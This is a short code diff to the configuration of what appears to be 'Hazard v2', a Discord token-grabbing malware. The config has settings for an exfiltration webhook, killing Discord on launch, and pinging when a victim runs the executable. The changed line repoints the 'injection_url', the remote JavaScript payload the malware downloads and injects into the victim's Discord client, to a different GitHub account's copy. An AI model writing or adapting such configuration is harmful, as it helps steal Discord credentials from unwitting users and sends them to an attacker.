@@ -79,7 +79,7 @@ config = {
     # ONLY HAVE THE BASE32 ENCODED KEY HERE IF YOU'RE USING https://github.com/Rdimo/Discord-Webhook-Protector
     'webhook_protector_key': "KEY_HERE",
     # keep it as it is unless you want to have a custom one
-    'injection_url': "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js",
+    'injection_url': "https://raw.githubusercontent.com/bananaman2020/Discord-Injection/master/injection.js",
     # if True, it will ping @everyone when someone ran Hazard v2
     'ping_on_run': False,
     # set to False if you don't want it to kill programs such as discord upon running the exe
